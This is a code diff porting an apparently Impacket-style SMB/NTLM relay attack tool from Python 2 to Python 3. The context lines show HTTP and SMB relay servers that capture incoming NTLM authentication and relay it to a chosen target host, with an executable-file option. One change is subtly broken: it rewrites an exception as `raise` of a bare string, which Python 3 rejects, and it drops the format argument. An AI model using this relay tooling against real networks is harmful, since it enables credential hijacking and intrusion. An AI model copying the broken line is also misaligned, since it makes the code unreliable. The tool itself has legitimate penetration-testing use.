@@ -42,8 +42,8 @@ import os
 import random
 import time
 import argparse
-import SimpleHTTPServer
-import SocketServer
+import http.server
+import socketserver
 import logging
 import base64
 
@@ -222,7 +222,7 @@ class SMBClient(smb.SMB):
         try:
             resp = dce.request(request)
             #resp.dump()
-        except Exception, e:
+        except Exception as e:
             #import traceback
             #print traceback.print_exc()
             logging.error(str(e))
@@ -348,7 +348,7 @@ class SMBClient(smb.SMB):
             return respToken['ResponseToken']
 
 class HTTPRelayServer(Thread):
-    class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+    class HTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, target, exeFile, mode):
             self.target = target
             self.exeFile = exeFile
@@ -356,18 +356,18 @@ class HTTPRelayServer(Thread):
             self.domainIp = None
             self.machineAccount = None
             self.machineHashes = None
-            SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
+            socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
-    class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+    class HTTPHandler(http.server.SimpleHTTPRequestHandler):
         def __init__(self,request, client_address, server):
             self.server = server
             self.protocol_version = 'HTTP/1.1'
             logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.server.target))
-            SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
+            http.server.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
 
         def handle_one_request(self):
             try:
-                SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
+                http.server.SimpleHTTPRequestHandler.handle_one_request(self)
             except:
                 pass
 
@@ -414,7 +414,7 @@ class HTTPRelayServer(Thread):
                     self.client = SMBClient(self.target, extended_security = True)
                     self.client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
                     self.client.set_timeout(60)
-                except Exception, e:
+                except Exception as e:
                    logging.error("Connection against target %s FAILED" % self.target)
                    logging.error(str(e))
 
@@ -515,7 +515,7 @@ class SMBRelayServer(Thread):
         #############################################################
         # SMBRelay
         smbData = smbServer.getConnectionData('SMBRelay', False)
-        if smbData.has_key(self.target):
+        if self.target in smbData:
             # Remove the previous connection and use the last one
             smbClient = smbData[self.target]['SMBClient']
             del(smbClient)
@@ -535,7 +535,7 @@ class SMBRelayServer(Thread):
             client = SMBClient(self.target, extended_security = extSec)
             client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
             client.set_timeout(60)
-        except Exception, e:
+        except Exception as e:
             logging.error("Connection against target %s FAILED" % self.target)
             logging.error(str(e))
         else: 
@@ -669,7 +669,7 @@ class SMBRelayServer(Thread):
                 # Let's store it in the connection data
                 connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
             else:
-                raise("Unknown NTLMSSP MessageType %d" % messageType)
+                raise "Unknown NTLMSSP MessageType %d"
 
             respParameters['SecurityBlobLength'] = len(respToken)
 
@@ -768,7 +768,7 @@ class SMBRelayServer(Thread):
 if __name__ == '__main__':
 
     RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
-    print version.BANNER
+    print(version.BANNER)
     parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to SMB relay that connection to the target system or the original client")
     parser.add_argument("--help", action="help", help='show this help message and exit')
     parser.add_argument('-h', action='store', metavar = 'HOST', help='Host to relay the credentials to, if not it will relay it back to the client')
@@ -783,7 +783,7 @@ if __name__ == '__main__':
 
     try:
        options = parser.parse_args()
-    except Exception, e:
+    except Exception as e:
        logging.error(str(e))
        sys.exit(1)
 
@@ -810,7 +810,7 @@ if __name__ == '__main__':
             sys.exit(1)
         s.start()
         
-    print ""
+    print("")
     logging.info("Servers started, waiting for connections")
     while True:
         try:
